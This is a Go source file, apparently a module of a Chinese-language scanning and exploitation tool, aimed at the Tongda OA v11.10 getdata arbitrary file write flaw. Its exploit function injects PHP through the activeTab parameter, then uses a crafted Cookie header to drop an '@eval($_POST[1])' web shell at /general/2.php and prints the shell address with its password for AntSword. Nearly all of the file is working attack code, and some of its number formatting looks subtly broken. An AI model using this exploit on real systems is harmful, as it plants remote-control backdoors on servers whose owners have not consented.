package vulners

import (
	"crypto/rand"
	"fmt"
	"math/big"
	"strings"

	"github.com/fatih/color"
)

type Td11 struct {
}

func (c *Td11) Scan(targetUrl string) {
	vulnerable, err := Td11scancore(targetUrl)
	if err != nil {
		color.Red("[X]请求异常！")
		return
	}
	if vulnerable {
		color.Green("[Td11] 存在v11.10 getdata 任意文件上传")
	} else {
		color.White("[Td11] 不存在v11.10 getdata 任意文件上传")
	}
}

func (*Td11) Exploit(targetUrl string) {
	runResult, err := Td11runcore(targetUrl)
	if err != nil {
		color.Red("[X]漏洞利用异常！")
		return
	}
	if runResult != "" {
		color.Green(runResult)
	} else {
		color.White("[!]漏洞利用无返回结果")
	}
}

func Td11scancore(targetUrl string) (bool, error) {

	n, _ := rand.Int(rand.Reader, big.NewInt(100000000))
	tmpNum := fmt.Sprintf("%d", &n)

	url1_1 := "/general/appbuilder/web/portal/gateway/getdata?activeTab=%e5%27,1%3d%3Efwrite(fopen(%22"
	url1_2 := ""
	url1_3 := tmpNum
	url1_4 := ".php%22,%22w+%22),%22%3C?php%20echo%20"
	url1_5 := url1_3
	url1_6 := ";%22))%3b/*&id=266&module=Carouselimage"
	url_test := "/general/appbuilder/web/portal/gateway/getdata?activeTab=%e5%27,1%3d%3Efwrite())%3b/*&id=266&module=Carouselimage"

	var resp, err = baseClient.NewRequest().SetHeader("Content-Type", "application/x-www-form-urlencoded").Get(targetUrl + url_test)
	if err != nil {
		return false, err
	}
	if resp.StatusCode != 200 {
		var chk string
		fmt.Println("[!]请输入通达OA的目录，如果不输入，则默认使用C:/MYOA/webroot/general/")
		fmt.Scanln(&chk)

		// 如果输入了字符
		if chk != "" {
			url1_2 = fmt.Sprintf("%v", chk)
			resp1, err := baseClient.
				NewRequest().
				SetHeader("Content-Type", "application/x-www-form-urlencoded").
				Get(targetUrl + url1_1 + url1_2 + url1_3 + url1_4 + url1_5 + url1_6)
			if err != nil {
				return false, err
			}
			if resp1.StatusCode == 200 {
				url2_1 := "/general/"
				url2_2 := fmt.Sprintf("%f", n)
				url2_3 := ".php"

				resp2, err := baseClient.
					NewRequest().
					SetHeader("Content-Type", "application/x-www-form-urlencoded").
					Get(targetUrl + url2_1 + url2_2 + url2_3)
				if err != nil {
					return false, err
				}

				resContent2 := resp2.String()
				if strings.Contains(resContent2, url2_2) {
					return true, nil
				} else {
					return false, nil
				}
			} else {
				return false, nil
			}
		} else {
			url1_2_2 := "C:/MYOA/webroot/general/"
			resp3, err := baseClient.
				NewRequest().
				SetHeader("Content-Type", "application/x-www-form-urlencoded").
				Get(targetUrl + url1_1 + url1_2_2 + url1_3 + url1_4 + url1_5 + url1_6)
			if err != nil {
				return false, err
			}
			if resp3.StatusCode == 200 {
				url2_1 := "/general/"
				url2_2 := tmpNum
				url2_3 := ".php"

				resp3, err := baseClient.
					NewRequest().
					SetHeader("Content-Type", "application/x-www-form-urlencoded").
					Get(targetUrl + url2_1 + url2_2 + url2_3)
				if err != nil {
					return false, err
				}

				resContent3 := resp3.String()
				if strings.Contains(resContent3, url2_2) {
					return true, nil
				}

			} else {
				return false, nil
			}

		}
	}
	return false, nil
}

func Td11runcore(targetUrl string) (string, error) {
	n, _ := rand.Int(rand.Reader, big.NewInt(100000000))
	tmpNum2 := fmt.Sprintf("%d", &n)

	url2_1 := "/general/appbuilder/web/portal/gateway/getdata?activeTab=%e5%27,1%3d%3Efwrite(fopen(%22"
	url2_2 := ""
	url2_3 := tmpNum2
	url2_4 := ".php%22,%22w+%22),%22"
	url2_5 := "%3C?php%20eval(next(getallheaders()));"
	url2_6 := "%22))%3b/*&id=266&module=Carouselimage"
	url2_test := "/general/appbuilder/web/portal/gateway/getdata?activeTab=%e5%27,1%3d%3Efwrite())%3b/*&id=266&module=Carouselimage"

	var resp, err = baseClient.NewRequest().SetHeader("Content-Type", "application/x-www-form-urlencoded").Get(targetUrl + url2_test)
	if err != nil {
		return "", err
	}
	resContent1 := resp.String()
	if strings.Contains(resContent1, "Error: fwrite() expects at least 2 parameters, 0 given") {
		var chk string
		fmt.Println("[!]请输入通达OA的目录，如果不输入，则默认使用C:/MYOA/webroot/general/")
		fmt.Scanln(&chk)

		// 如果输入了字符
		if chk != "" {
			url2_2 = fmt.Sprintf("%v", chk)
			resp1, err := baseClient.
				NewRequest().
				SetHeader("Content-Type", "application/x-www-form-urlencoded").
				Get(targetUrl + url2_1 + url2_2 + url2_3 + url2_4 + url2_5 + url2_6)
			if err != nil {
				return "", err
			}
			if resp1.StatusCode == 200 {
				url2_1 := "/general/"
				url2_2 := tmpNum2
				url2_3 := ".php"

				resp2, err := baseClient.
					NewRequest().
					SetHeaders(map[string]string{
						"Cookie":          "file_put_contents('2.php','<?php @eval($_POST[1]);?>');",
						"Accept":          "*/*",
						"Accept-Encoding": "gzip, deflate",
					}).
					Get(targetUrl + url2_1 + url2_2 + url2_3)
				if err != nil {
					return "", err
				}

				if resp2.StatusCode != 200 {
					return "", nil
				} else {
					resultStrings1 := "[Td11] 存在v11.10 getdata 任意文件上传，漏洞利用成功！\nWebShell地址：\n"
					resultStrings2 := targetUrl + "/general/"
					resultStrings3 := "2.php"
					resultStrings4 := "\n请使用蚁剑连接本WebShell，密码：1"
					resultStringTotal := resultStrings1 + resultStrings2 + resultStrings3 + resultStrings4
					return resultStringTotal, nil

				}
			} else {
				return "", nil
			}
		} else {
			url2_2_2 := "C:/MYOA/webroot/general/"
			resp3, err := baseClient.
				NewRequest().
				SetHeader("Content-Type", "application/x-www-form-urlencoded").
				Get(targetUrl + url2_1 + url2_2_2 + url2_3 + url2_4 + url2_5 + url2_6)
			if err != nil {
				return "", err
			}
			if resp3.StatusCode == 200 {
				url2_1 := "/general/"
				url2_2 := tmpNum2
				url2_3 := ".php"

				resp3, err := baseClient.
					NewRequest().
					SetHeaders(map[string]string{
						"Cookie":          "file_put_contents('2.php','<?php @eval($_POST[1]);?>');",
						"Accept":          "*/*",
						"Accept-Encoding": "gzip, deflate",
					}).
					Get(targetUrl + url2_1 + url2_2 + url2_3)
				if err != nil {
					return "", err
				}
				//访问WebShell
				if resp3.StatusCode != 200 {
					return "", nil
				} else {
					url2_4 := "2.php"

					resp4, err := baseClient.
						NewRequest().
						Get(targetUrl + url2_1 + url2_4)
					if err != nil {
						return "", err
					}

					if resp4.StatusCode != 200 {
						return "", err
					} else {
						resultStrings1 := "[Td11] 存在v11.10 getdata 任意文件上传，漏洞利用成功！\nWebShell地址：\n"
						resultStrings2 := targetUrl + "/general/"
						resultStrings3 := "2.php"
						resultStrings4 := "\n请使用蚁剑连接本WebShell，密码：1"
						resultStringTotal := resultStrings1 + resultStrings2 + resultStrings3 + resultStrings4
						return resultStringTotal, nil
					}
				}

			} else {
				resultStrings1 := "[Td11] 存在v11.10 getdata 任意文件上传，漏洞利用成功！\nWebShell地址：\n"
				resultStrings2 := targetUrl + "/general/"
				resultStrings3 := "2.php"
				resultStrings4 := "\n请使用蚁剑连接本WebShell，密码：1"
				resultStringTotal := resultStrings1 + resultStrings2 + resultStrings3 + resultStrings4
				return resultStringTotal, nil

			}

		}
	}
	return "", nil
}
